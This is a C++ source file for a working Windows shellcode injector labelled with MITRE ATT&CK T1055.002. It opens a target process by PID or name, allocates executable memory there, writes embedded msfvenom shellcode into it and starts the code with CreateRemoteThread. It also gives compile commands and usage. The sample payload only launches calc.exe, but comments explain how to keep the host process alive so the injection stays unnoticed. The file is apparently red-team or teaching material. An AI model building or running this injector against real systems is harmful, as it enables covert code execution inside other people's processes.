/*
 * Classic Shellcode Injection - CreateRemoteThread + VirtualAllocEx
 *
 * MITRE ATT&CK: T1055.002 - Portable Executable Injection
 *               (base: T1055 - Process Injection)
 *
 * Chain:
 *   OpenProcess -> VirtualAllocEx(RWX) -> WriteProcessMemory ->
 *   CreateRemoteThread(entry = shellcode address) -> shellcode runs
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o inject.exe classic_injection.cpp
 *   cl /std:c++20 classic_injection.cpp /Fe:inject.exe
 *
 * Usage:
 *   inject.exe <PID>
 *   inject.exe notepad.exe
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

/*
 * x64 shellcode: WinExec("calc.exe", 0) + ExitThread
 *
 * Generated with:
 *   msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 *
 * EXITFUNC=thread is critical: default EXITFUNC=process calls ExitProcess()
 * on the target, killing it. EXITFUNC=thread only exits the injected
 * thread, so the host process keeps running.
 */
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";


static DWORD find_pid_by_name(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID or process_name>\n", argv[0]);
        printf("  %s 1234\n", argv[0]);
        printf("  %s notepad.exe\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    if (pid == 0) {
        char name[256];
        snprintf(name, sizeof(name), "%s", argv[1]);
        if (!strstr(name, ".exe")) strncat(name, ".exe", sizeof(name) - strlen(name) - 1);
        pid = find_pid_by_name(name);
        if (!pid) { printf("[-] Process not found: %s\n", name); return 1; }
        printf("[+] Found %s @ PID %lu\n", name, pid);
    }

    printf("[*] Opening PID %lu...\n", pid);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 1; }

    printf("[*] Allocating %zu bytes RWX in target...\n", sizeof(shellcode));
    LPVOID addr = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) { printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError()); CloseHandle(hProc); return 1; }
    printf("[+] Allocated @ %p\n", addr);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, addr, shellcode, sizeof(shellcode), &written)) {
        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Wrote %zu bytes\n", written);

    printf("[*] CreateRemoteThread with shellcode as entry...\n");
    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hT) {
        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProc, addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Remote thread fired. Shellcode running in PID %lu.\n", pid);
    printf("[+] Target survives (shellcode exits via ExitThread, not ExitProcess).\n");

    WaitForSingleObject(hT, 5000);
    CloseHandle(hT);
    CloseHandle(hProc);
    return 0;
}
